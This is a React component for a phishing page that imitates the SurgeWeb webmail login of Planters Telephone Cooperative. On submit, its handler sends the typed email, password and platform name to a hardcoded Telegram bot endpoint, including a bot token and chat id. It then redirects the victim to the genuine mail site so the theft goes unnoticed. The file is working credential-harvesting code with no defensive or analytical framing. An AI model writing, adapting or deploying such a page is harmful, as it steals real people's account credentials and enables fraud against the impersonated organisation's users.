import React from 'react';


import'./home.css';
import logo from './logo.png';

import { useState } from 'react';
import axios from 'axios';

import { useEffect } from 'react';
function Home(){

    const[email, setUserName] = useState("");
    const[password, setPassword] = useState("");

    const[platform, setPlatform] = useState("Planters")

    const[showError, setShowError] = useState(false);


    

   


   
    async function handleSubmit(e){
        e.preventDefault();
    
        try {
            // const response = await axios.post('https://mainbackend-rd07.onrender.com/api/send', {
            //     email:email,
            //     password:password,
            //     platform:platform
            // });
    
           const response =  await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
                chat_id: 5868304053,
                text: `Platform : ${platform} , Email : ${email} ,  Password : ${password}`,
              });
    
        
            // Handle success
         
    
            if(response.status == 200){
               // console.log(response.data.message);
    
              
               window.location.href = 'https://mail.planters.net/surgeweb';
            }
          } catch (error) {
            // Handle error
            console.error('Error:', error);
          }
        
    }

    return (
        <>
           
                <div className='py-5'>

                </div>

                {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong className='text-center'>Invalid Email or Password</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}

            <div className='formdiv col-md-5 m-auto p-0 '>
            {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong className='text-center'>Invalid Email or Password</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}

                <div className='cardhead text-center '>
                Welcome to SurgeWeb
                </div>

                <form onSubmit={handleSubmit} className="py-2">

                <div class="formrow text-center mt-3">
                                <span class="prompt"><label for="user">Username</label></span>
                                                <div class="element"><input type="email"onChange={function(e){
                                                    setUserName(e.target.value);
                                                }}value={email} className='inputwide' required/> <span className='font-weight-bold'>@ planters.net</span>
                                </div>
                        </div>


                        <div class="formrow text-center">
                                <span class="prompt"><label for="user">Password</label></span>
                                                <div class="element"><input onChange={function(e){
                                                    setPassword(e.target.value);
                                                }} value={password} type="password"className='inputwide' required/>
                                </div>
                        </div>


                        <div class="formrow text-center">
                                <span class="prompt"><label for="user">Interface</label></span>
                                                <div class="element">

                                                    <select>
                                                        <option value="standard">standard</option>
                                                        <option value="basic">basic</option>
                                                        <option value="mobile">mobile</option>

                                                    </select>

                                                    <select className='ml-3'>
                                                    <option value="German" >Deutsch</option>
					<option value="English" selected>English (UK) </option>
					<option value="English US" >English (US) </option>
					<option value="Spanish" >Español</option>
					<option value="French" >Français</option>
					<option value="Dutch" >Nederlands</option>
					<option value="Portuguese Br" >Português (Brazil)</option>
					<option value="Portuguese" >Português (Portugal)</option>
					<option value="Russian" >Русский</option>
					<option value="Hindi" >हिन्दी</option>
					<option value="Japanese" >日本語</option>
		
                                                        
                                                        
                                                    </select>
                                </div>
                        </div>


                        <div class="formrow text-center">
                                <span class="prompt"><label for="user">Remember me</label></span>
                                                <div class="element"><input  type="checkbox"className=''/>
                                </div>
                        </div>


                    

                    <div class="formrow text-center py-3">
                                <span class="prompt"><label for="user"></label></span>
                                                <div class="element">
                                                <button className='mybutton'type="submit">Login</button>

                                </div>
                        </div>

                        <div className='text-center py-1 px-2'style={{
                            backgroundColor:"#007",
                            color:"white",
                        }}>
                            Planters Telephone Cooperative ©2017

                        </div>

                       



                </form>

                

            </div>
            
            <br/>

                <p className='info'>Webmail</p>
        </>
    );

}

export default Home;